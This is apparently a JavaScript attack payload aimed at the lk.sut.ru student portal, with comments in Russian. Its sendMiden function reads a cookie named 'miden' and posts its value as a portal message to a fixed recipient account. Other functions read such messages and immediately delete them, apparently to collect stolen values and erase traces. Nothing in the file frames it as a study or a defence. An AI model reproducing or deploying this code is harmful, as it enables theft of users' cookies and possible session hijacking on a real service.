function set_Cookie(name, value, expires, path, domain, secure) {
	// Установка cookie
    var curCookie = name + "=" + escape(value) +
        ((expires) ? "; expires=" + expires.toGMTString() : "") +
        ((path) ? "; path=" + path : "") +
        ((domain) ? "; domain=" + domain : "") +
        ((secure) ? "; secure" : "");
        document.cookie = curCookie;
}

function getCookie(name) {
	// Получение cookie
    var prefix = name + "="
    var cookieStartIndex = document.cookie.indexOf(prefix)
    if (cookieStartIndex == -1)
            return null
    var cookieEndIndex = document.cookie.indexOf(";", cookieStartIndex + prefix.length)
    if (cookieEndIndex == -1)
            cookieEndIndex = document.cookie.length
    return unescape(document.cookie.substring(cookieStartIndex + prefix.length, cookieEndIndex))
}

function sendMiden(){
	// Получает cookie и отправляет miden
	let miden = getCookie('miden')
	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", 'idinfo=0&title=MyMiden&mes='+miden+'&adresat=97130')
}

function delMes(id){
	// Удаляет сообщение по id
	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", "idinfo="+id+"&title=&mes=&adresat=0")
}

function get_n_clear(id){
	// Читает сообщение id и сразу его удаляет
	let a = $.post("https://lk.sut.ru/cabinet/project/cabinet/forms/sendto2.php", data="id="+id+"&prosmotr")
	setTimeout(function() { console.log($(JSON.parse(a.responseText))[0].annotation); delMes(id) }, 1000)
}
